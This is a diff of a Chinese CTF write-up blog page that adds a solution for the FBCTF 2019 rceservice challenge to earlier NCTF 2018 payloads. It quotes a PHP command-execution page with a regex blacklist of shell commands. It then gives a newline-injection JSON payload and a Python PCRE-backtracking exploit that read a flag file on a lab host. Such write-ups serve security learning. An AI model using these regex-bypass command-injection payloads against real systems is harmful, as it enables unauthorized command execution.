@@ -74,7 +74,7 @@
     <div id="toc" class="toc-article">
     <h3><i class="fa-brands fa-readme"></i>  目录</h3>
       <div class="toc-title"></div>
-      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-easy-web"><span class="toc-text">[安洵杯 2019]easy_web</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#NCTF-2018-Easy-Audit"><span class="toc-text">[NCTF 2018]Easy_Audit</span></a></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-easy-web"><span class="toc-text">[安洵杯 2019]easy_web</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#NCTF-2018-Easy-Audit"><span class="toc-text">[NCTF 2018]Easy_Audit</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#FBCTF-2019-rceservice"><span class="toc-text">[FBCTF 2019]rceservice</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%95%E4%B8%80%EF%BC%9A%E6%8D%A2%E8%A1%8C%E7%BB%95%E8%BF%87"><span class="toc-text">法一：换行绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%95%E4%BA%8C%EF%BC%9APCRE%E5%9B%9E%E6%BA%AF"><span class="toc-text">法二：PCRE回溯</span></a></li></ol></li></ol>
     </div>
   
         
@@ -246,12 +246,12 @@
             
             <span class="tag">
                 
-                <a href="/blog/tags/%E5%88%B7%E9%A2%98/" style="color: #00bcd4">刷题</a>
+                <a href="/blog/tags/%E5%88%B7%E9%A2%98/" style="color: #ff7d73">刷题</a>
             </span>
             
             <span class="tag">
                 
-                <a href="/blog/tags/NSS/" style="color: #ff7d73">NSS</a>
+                <a href="/blog/tags/NSS/" style="color: #03a9f4">NSS</a>
             </span>
             
         </span>
@@ -265,7 +265,7 @@
         <i class="fa fa-keyboard-o"></i>
         <span class="post-meta-item-text">  字数统计: </span>
         <!-- 安装插件npm install hexo-wordcount --save -->
-        <span class="post-count">1.1k字</span>
+        <span class="post-count">1.6k字</span>
       </span>
     </span>
 
@@ -274,7 +274,7 @@
       <span class="post-meta-item-icon">
         <i class="fa fa-hourglass-half"></i>
         <span class="post-meta-item-text">  阅读时长: </span>
-        <span class="post-count">5分</span>
+        <span class="post-count">8分</span>
       </span>
     </span>
     
@@ -393,7 +393,7 @@
 <p>首先要满足<code>substr($_GET[&#39;yulige&#39;], 32) === md5($_GET[&#39;yulige&#39;]</code></p>
 <p>这个只需要用数组返回false即可绕过</p>
 <p>然后是<code>preg_match(&#39;/nctfisfun$/&#39;, $_GET[&#39;nctf&#39;]) &amp;&amp; $_GET[&#39;nctf&#39;] !== &#39;nctfisfun&#39;</code></p>
-<p>这里看一眼apache的版本2.4.18，存在换行解析漏洞<code>%0a</code>可以绕过</p>
+<p>我们知道<code>preg_match</code>存在换行解析漏洞<code>%0a</code>可以绕过</p>
 <p>然后是读取文件匹配字符串，直接用data伪协议即可，然后就能得到flag</p>
 </li>
 <li><p>现在我们回来看上面对<code>$_SERVER</code>的解析的waf，要匹配的是<code>$_SERVER[&#39;QUERY_STRING&#39;]</code>即get请求中<code>?</code>参数后的原始内容</p>
@@ -406,6 +406,70 @@
 <p>最终payload：</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token constant">GET</span><span class="token punctuation">:</span> <span class="token operator">?</span><span class="token operator">%</span><span class="token number">79</span><span class="token operator">%</span><span class="token number">75</span><span class="token operator">%</span><span class="token number">6</span>C<span class="token operator">%</span><span class="token number">69</span><span class="token operator">%</span><span class="token number">67</span><span class="token operator">%</span><span class="token number">65</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">&amp;</span><span class="token operator">%</span><span class="token number">6</span>E<span class="token operator">%</span><span class="token number">63</span><span class="token operator">%</span><span class="token number">74</span><span class="token operator">%</span><span class="token number">66</span><span class="token operator">=</span><span class="token operator">%</span><span class="token number">6</span>E<span class="token operator">%</span><span class="token number">63</span><span class="token operator">%</span><span class="token number">74</span><span class="token operator">%</span><span class="token number">66</span><span class="token operator">%</span><span class="token number">69</span><span class="token operator">%</span><span class="token number">73</span><span class="token operator">%</span><span class="token number">66</span><span class="token operator">%</span><span class="token number">75</span><span class="token operator">%</span><span class="token number">6</span>E<span class="token operator">%</span><span class="token number">0</span>a<span class="token operator">&amp;</span><span class="token operator">%</span><span class="token number">66</span><span class="token operator">%</span><span class="token number">6</span>C<span class="token operator">%</span><span class="token number">61</span><span class="token operator">%</span><span class="token number">67</span><span class="token operator">=</span>data<span class="token punctuation">:</span><span class="token comment">//text/plain,ccc_liubi</span>
 <span class="token constant">POST</span><span class="token punctuation">:</span> yulige<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>nctf<span class="token operator">=</span><span class="token number">2</span><span class="token operator">&amp;</span>flag<span class="token operator">=</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<hr>
+<h1 id="FBCTF-2019-rceservice"><a href="#FBCTF-2019-rceservice" class="headerlink" title="[FBCTF 2019]rceservice"></a>[FBCTF 2019]rceservice</h1><blockquote>
+<p>正则绕过</p>
+</blockquote>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>Web Adminstration Interface<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span>
+
+<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+
+<span class="token function">putenv</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'PATH=/home/rceservice/jail'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+  <span class="token variable">$json</span> <span class="token operator">=</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+
+  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$json</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'Hacking attempt detected&lt;br/>&lt;br/>'</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span> <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/'</span><span class="token punctuation">,</span> <span class="token variable">$json</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'Hacking attempt detected&lt;br/>&lt;br/>'</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'Attempting to run command:&lt;br/>'</span><span class="token punctuation">;</span>
+    <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token function">json_decode</span><span class="token punctuation">(</span><span class="token variable">$json</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$cmd</span> <span class="token operator">!==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+      <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
+      <span class="token keyword">echo</span> <span class="token string single-quoted-string">'Invalid input'</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;br/>&lt;br/>'</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token delimiter important">?></span></span>
+
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span><span class="token punctuation">></span></span>
+      Enter command as JSON:
+      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>cmd<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>首先把环境变量的目录设置在<code>/home/rceservice/jail</code>，应该是用来限制我们能直接使用的命令</p>
+<p>然后给了一个能命令执行的框，我们输入的命令会以json的形式传入，那根据代码的要求，大概的json格式就是这样：<code>&#123;&quot;cmd&quot;:&quot;ls&quot;&#125;</code></p>
+<p>但是正则匹配ban掉了大量的命令，那么这里有两种方法</p>
+<h2 id="法一：换行绕过"><a href="#法一：换行绕过" class="headerlink" title="法一：换行绕过"></a>法一：换行绕过</h2><p>这里的正则匹配规则是<code>/^.*( ).*$/</code>，很明显能用%0a进行绕过</p>
+<p>同时要保持json格式，所以我们的payload为</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token punctuation">&#123;</span><span class="token operator">%</span><span class="token number">0</span>a<span class="token string double-quoted-string">"cmd"</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"ls /home/rceservice/jail"</span><span class="token operator">%</span><span class="token number">0</span>a<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>此时json解析后的格式就是</p>
+<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>                       <span class="token comment">// 只匹配这行</span>
+    <span class="token string">"cmd"</span>：<span class="token string">"ls /home/rceservice/jail"</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>传入payload，发现jail下只有ls一个命令，那我们需要用<code>/bin/cat</code>来调用cat命令读取</p>
+<p>测试发现flag在&#x2F;home&#x2F;rceservice下</p>
+<p>所以最终的payload：</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>cmd<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token operator">%</span><span class="token number">0</span>a<span class="token string double-quoted-string">"cmd"</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"/bin/cat /home/rceservice/flag"</span><span class="token operator">%</span><span class="token number">0</span>a<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<hr>
+<h2 id="法二：PCRE回溯"><a href="#法二：PCRE回溯" class="headerlink" title="法二：PCRE回溯"></a>法二：PCRE回溯</h2><p>这个就不多说了，直接上exp，注意get请求有长度限制，所以这里要用post请求</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
+payload <span class="token operator">=</span> <span class="token string">'&#123;"cmd":"/bin/cat /home/rceservice/flag","test":"'</span> <span class="token operator">+</span> <span class="token string">"a"</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">1000000</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'"&#125;'</span>
+res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">"http://node4.anna.nssctf.cn:28398/"</span><span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"cmd"</span><span class="token punctuation">:</span>payload<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 
 <hr>
 
